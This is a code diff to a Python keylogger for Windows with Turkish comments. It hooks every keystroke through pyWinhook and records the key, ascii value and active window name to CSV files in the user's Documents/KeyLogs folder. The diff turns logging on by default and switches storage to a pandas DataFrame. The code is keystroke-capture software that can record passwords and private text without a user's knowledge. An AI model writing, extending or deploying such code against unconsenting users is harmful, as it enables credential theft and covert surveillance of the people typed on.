@@ -6,7 +6,7 @@
 ######################################################
 
 try:
-    import os, pyWinhook, pygame, atexit
+    import os, pyWinhook, pygame, atexit, pandas
     from datetime import datetime
 except ImportError as ext:
     path = pyHook.__file__
@@ -33,66 +33,51 @@ LVL_NONE = 0  # Çıktı yok
 #            EVRENSEL DEĞİŞKENLER           
 #############################################
 
-LOG_ACTIVE = False
+LOG_ACTIVE = True
 LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
-LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".log"
+LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".csv"
 LOG_LVL = LVL_INFO
 KEY_LIMIT = 1
 SHORTCUT = (162, 164, 36) # CTRL + ALT + HOME
 
-#############################################
+#############################################yunusemreak
 #                FONKSİYONLAR               
 #############################################
 
-def parseData(event):
-    keyData = []
-    keyData.append(f"")
-    keyData.append(f"UTC Time:    {datetime.utcnow()}")
-    keyData.append(f"Boot Time:   {event.Time}")
-    keyData.append(f"MessageName: {event.MessageName}")
-    keyData.append(f"Message:     {event.Message}")
-    keyData.append(f"Window:      {event.Window}")
-    keyData.append(f"WindowName:  {event.WindowName}")
-    keyData.append(f"Ascii:       {event.Ascii}")
-    keyData.append(f"Key:         {event.Key}")
-    keyData.append(f"KeyID:       {event.KeyID}")
-    keyData.append(f"ScanCode:    {event.ScanCode}")
-    keyData.append(f"Extended:    {event.Extended}")
-    keyData.append(f"Injected:    {event.Injected}")
-    keyData.append(f"Alt:         {event.Alt}")
-    keyData.append(f"Transition:  {event.Transition}")
-    keyData.append(f"")
+def regData(event):
+    datas = [
+        datetime.utcnow(),
+        event.Time,
+        event.MessageName,
+        event.Message,
+        event.Window,
+        event.WindowName,
+        event.Ascii,
+        event.Key,
+        event.KeyID,
+        event.ScanCode,
+        event.Extended,
+        event.Injected,
+        event.Alt,
+        event.Transition
+    ]
 
-    return keyData
-
-def printKeyData(keyData):
-    if LOG_LVL >= LVL_DEBUG:
-        print("\n".join(keyData))
+    assert len(COLUMNS) == len(datas), "Sütun ile veri sayısı aynı değil :("
+    DATA_FRAME.loc[len(DATA_FRAME)] = datas
 
 
-def logDirectly(keyData):
+def logDirectly():
     try:
-        CONTEXT_FILE.write("\n".join(keyData))
+        DATA_FRAME.to_csv(CONTEXT_FILE, header=CONTEXT_FILE.tell()==0)
+        DATA_FRAME.drop(DATA_FRAME.index, inplace=True)
         CONTEXT_FILE.flush()
-    except:
-        pass
+    except Exception as e:
+        print(e)
 
 
-def logOnReach(keyData):
-
-    def logListLines(list_keyData):
-        for keyData in list_keyData:
-            logDirectly(list_line)
-
-
-    if not LOG_ACTIVE:
-        return
-
-    global list_keyData
-    list_keyData.append(keyData)
-
-    if len(list_keyData) > KEY_LIMIT:
-        logListLines(list_keyData)
+def logOnReach(limit):
+    if len(DATA_FRAME) >= limit:
+        logDirectly()
 
 def resetShortCut():
     global list_press
@@ -142,14 +127,8 @@ def handleShortcutPressed(event):
 
 def OnKeyboardEvent(event):
     handleShortcutPressed(event)
-
-    keyData = parseData(event)
-    printKeyData(keyData)
-
-    if KEY_LIMIT <= 1:
-        logDirectly(keyData)
-    else:
-        logOnReach(keyData)
+    regData(event)
+    logOnReach(KEY_LIMIT)
 
     return True
 
@@ -224,8 +203,25 @@ Alt:         0
 Transition:  0 
 """
 
+COLUMNS = [
+    "UTC Time",
+    "Boot Time",
+    "MessageName",
+    "Message",
+    "Window",
+    "WindowName",
+    "Ascii",
+    "Key",
+    "KeyID",
+    "ScanCode",
+    "Extended",
+    "Injected",
+    "Alt",
+    "Transition"
+]
+
+DATA_FRAME = pandas.DataFrame(columns=COLUMNS)
 CONTEXT_FILE = openFile()
-list_keyData = []
 list_press = [False, False, False]
 isShortcut = False
 
